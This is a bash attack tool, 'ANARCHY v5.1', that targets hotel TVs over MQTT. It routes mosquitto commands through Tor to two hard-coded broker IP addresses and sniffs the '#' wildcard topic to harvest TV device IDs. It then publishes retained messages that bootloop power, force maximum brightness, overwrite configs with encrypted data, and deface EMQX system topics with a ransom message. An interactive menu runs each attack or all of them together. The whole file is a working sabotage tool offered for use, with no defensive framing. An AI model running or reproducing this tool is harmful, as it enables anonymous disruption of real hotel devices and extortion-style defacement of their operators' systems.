#!/bin/bash
# ANARCHY v5.1 - FIXED WILDCARD + DUAL BROKER
set -euo pipefail

# DUAL BROKER SUPPORT
BROKERS=(
    "104.198.241.70:1883"
    "120.55.14.230:1883"
)

TOR="torsocks"
MAX_BRIGHT="255"
LOCKED_STATUS="LOCKED-TRUSTEDF57"
RANSOM_MSG="🔥 HOTEL TV TAKEOVER  🔥
TRUSTEDF57 - ALL HOTEL TVS COMPROMISED
POWER | BRIGHTNESS | CONTROL LOCKED"

ENCRYPT_PAYLOAD() {
    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-ANARCHY" 2>/dev/null | sed 's/=//g'
}

TOR_PUB_BROKER() {
    local host=$1 port=$2 topic=$3 payload=$4 qos=2
    [[ $# -eq 5 ]] && qos=$5
    ${TOR} mosquitto_pub -h "$host" -p "$port" -r -q "$qos" -t "$topic" -m "$payload"
}

discover_targets() {
    local host_port=$1 host=${host_port%:*} port=${host_port#*:}
    echo "[🔍] DISCOVERING su ${host}:${port} (Ctrl+C dopo 30s)..."
    
    timeout 30 ${TOR} mosquitto_sub -h "$host" -p "$port" -t "#" | \
    grep -iE "(Hotel/Tv/|/tv/)" 2>/dev/null | \
    sed 's|^.*/||' | \
    grep -E '^[a-f0-9]{32}$' | \
    sort -u > "hotel_tvs_${host//./_}_${port}.txt" || true
    
    if [[ -s "hotel_tvs_${host//./_}_${port}.txt" ]]; then
        wc -l "hotel_tvs_${host//./_}_${port}.txt"
    else
        echo "❌ No TVs found, using fallback..."
        echo "5295191d5eb26b6eb2e6189ab7db0c9d" > "hotel_tvs_${host//./_}_${port}.txt"
    fi
}

load_tvs() {
    local host_port=$1 host=${host_port%:*} port=${host_port#*:}
    TV_FILE="hotel_tvs_${host//./_}_${port}.txt"
    if [[ -f "$TV_FILE" ]]; then
        mapfile -t HOTEL_TVS < "$TV_FILE"
        echo "[📺] Loaded ${#HOTEL_TVS[@]} TVs da ${host_port}"
    else
        echo "❌ No TV file, run discovery!"
        HOTEL_TVS=()
    fi
}

show_menu() {
    clear
    TV_COUNT=${#HOTEL_TVS[@]}
    cat << EOF
┌─ TRUSTEDF57 - ${HOST_PORT} (${TV_COUNT} TVs) ─────┐
│ 1) 🔍 FULL WILDCARD DISCOVERY (#)                    │
│ 2) 📺 FORCE ALL TVs ONLINE                           │
│ 3) 🔄 TV POWER BOOTLOOP (ALL)                        │
│ 4) 💡 MAX BRIGHTNESS 255 (ALL)                       │
│ 5) 📡 EMQX BROKER RANSOM                             │
│ 6) 🔒 HOTEL TVS FULL LOCKDOWN                        │
│ 7) ⚙️ SYS BROKER OVERWRITE                           │
│ 8) 🔐 ALL TV CONFIGS ENCRYPTED                       │
│ 9) 🎪 TOTAL HOTEL ANARCHY v5.1                       │
│ S) 🔄 SWITCH BROKER (${BROKER_INDEX}/${#BROKERS[@]})│
│ 0) ❌ EXIT                                           │
└──────────────────────────────────────────────────────┘
EOF
}

check_tvs_loaded() {
    [[ ${#HOTEL_TVS[@]} -eq 0 ]] && { 
        echo "❌ No TVs loaded! Run option 1 (discovery) first"
        return 1
    }
    return 0
}

force_all_tvs_online() {
    check_tvs_loaded || return
    echo "[📺] Force ${#HOTEL_TVS[@]} TVs ONLINE..."
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "${HOST}" "${PORT}" "Hotel/Tv/${tv}" "ONLINE-LOCKED-TRUSTEDF57" 1
    done
    echo "✅ ${#HOTEL_TVS[@]} TVs online"
}

tv_power_bootloop_all() {
    check_tvs_loaded || return
    echo "[🔄] BOOTLOOP ${#HOTEL_TVS[@]} TVs..."
    bootloop="POWER1 1;Delay 800;POWER1 0;Delay 400;POWER1 1;Delay 1500;POWER1 0;LOOP"
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "${HOST}" "${PORT}" "Hotel/Tv/${tv}/POWER" "BOOTLOOP-START"
        TOR_PUB_BROKER "${HOST}" "${PORT}" "Hotel/Tv/${tv}/CMND" "${bootloop}"
    done
    echo "✅ Bootloop deployed"
}

max_brightness_all() {
    check_tvs_loaded || return
    echo "[💡] MAX 255 ${#HOTEL_TVS[@]} TVs..."
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "${HOST}" "${PORT}" "Hotel/Tv/${tv}/POWER" "1"
        TOR_PUB_BROKER "${HOST}" "${PORT}" "Hotel/Tv/${tv}/BRIGHTNESS" "${MAX_BRIGHT}"
        TOR_PUB_BROKER "${HOST}" "${PORT}" "Hotel/Tv/${tv}" "MAX-BRIGHT-LOCKED"
    done
    echo "✅ Max brightness set"
}

emqx_ransom() {
    echo "[📡] RANSOM ${HOST_PORT}..."
    TOR_PUB_BROKER "${HOST}" "${PORT}" "\$SYS/brokers/emqx@127.0.0.1/sysdescr" "${RANSOM_MSG}"
    TOR_PUB_BROKER "${HOST}" "${PORT}" "\$SYS/brokers/emqx@127.0.0.1/version" "${LOCKED_STATUS}"
    TOR_PUB_BROKER "${HOST}" "${PORT}" "\$SYS/brokers" "ANARCHY-v5.1"
    echo "✅ Ransomed"
}

hotel_tvs_lockdown() {
    check_tvs_loaded || return
    echo "[🔒] LOCKDOWN ${#HOTEL_TVS[@]} TVs..."
    locked_data="{\"status\":\"${LOCKED_STATUS}\",\"brightness\":${MAX_BRIGHT},\"power\":\"1\"}"
    crypt_data=$(ENCRYPT_PAYLOAD "${locked_data}")
    
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "${HOST}" "${PORT}" "Hotel/Tv/${tv}" "${LOCKED_STATUS}"
        TOR_PUB_BROKER "${HOST}" "${PORT}" "Hotel/Tv/${tv}/status" "${crypt_data}"
        TOR_PUB_BROKER "${HOST}" "${PORT}" "Hotel/Tv/${tv}/config" "${crypt_data}"
    done
    echo "✅ Locked"
}

sys_broker_overwrite() {
    echo "[⚙️] SYS OVERWRITE..."
    TOR_PUB_BROKER "${HOST}" "${PORT}" "\$SYS/brokers/emqx@127.0.0.1/sysdescr" "ANARCHY-EMQX-v5.1"
    TOR_PUB_BROKER "${HOST}" "${PORT}" "\$SYS/brokers" "${LOCKED_STATUS}"
    TOR_PUB_BROKER "${HOST}" "${PORT}" "\$SYS/brokers/emqx@127.0.0.1/version" "5.1-COMPROMISED"
    echo "✅ Overwritten"
}

all_configs_encrypted() {
    check_tvs_loaded || return
    echo "[🔐] ENCRYPT ${#HOTEL_TVS[@]} CONFIGS..."
    encrypt_payload="{\"v\":\"5.1\",\"status\":\"ENCRYPTED\",\"control\":\"BLOCKED\"}"
    crypt_payload=$(ENCRYPT_PAYLOAD "${encrypt_payload}")
    
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "${HOST}" "${PORT}" "Hotel/Tv/${tv}/config" "${crypt_payload}"
        TOR_PUB_BROKER "${HOST}" "${PORT}" "Hotel/Tv/${tv}/status" "${crypt_payload}"
        TOR_PUB_BROKER "${HOST}" "${PORT}" "Hotel/Tv/${tv}/power" "${crypt_payload}"
        TOR_PUB_BROKER "${HOST}" "${PORT}" "Hotel/Tv/${tv}/brightness" "${crypt_payload}"
    done
    echo "✅ Encrypted"
}

total_anarchy_v51() {
    check_tvs_loaded || return
    echo "🎪 TOTAL ANARCHY - ${#HOTEL_TVS[@]} TVs..."
    force_all_tvs_online
    sleep 2
    tv_power_bootloop_all
    sleep 2
    max_brightness_all
    sleep 2
    emqx_ransom
    sleep 2
    hotel_tvs_lockdown
    sleep 2
    sys_broker_overwrite
    sleep 2
    all_configs_encrypted
    echo "🎉 COMPLETE!"
}

switch_broker() {
    BROKER_INDEX=$(( (BROKER_INDEX + 1) % ${#BROKERS[@]} ))
    HOST_PORT="${BROKERS[$BROKER_INDEX]}"
    HOST=${HOST_PORT%:*} PORT=${HOST_PORT#*:}
    load_tvs "${HOST_PORT}"
    echo "🔄 Switched to ${HOST_PORT}"
}

# INIT
BROKER_INDEX=0
HOST_PORT="${BROKERS[0]}"
HOST=${HOST_PORT%:*} PORT=${HOST_PORT#*:}
HOTEL_TVS=()

while true; do
    show_menu
    read -r CHOICE </dev/tty
    case "${CHOICE}" in
        1) discover_targets "${HOST_PORT}"; load_tvs "${HOST_PORT}" ;;
        2) force_all_tvs_online ;;
        3) tv_power_bootloop_all ;;
        4) max_brightness_all ;;
        5) emqx_ransom ;;
        6) hotel_tvs_lockdown ;;
        7) sys_broker_overwrite ;;
        8) all_configs_encrypted ;;
        9) total_anarchy_v51 ;;
        [Ss]) switch_broker ;;
        0) echo "[+] EXIT"; exit 0 ;;
        *) echo "❌ Invalid: ${CHOICE}" ;;
    esac
    echo
    read -r -p "⏸️  ENTER..." </dev/tty
done
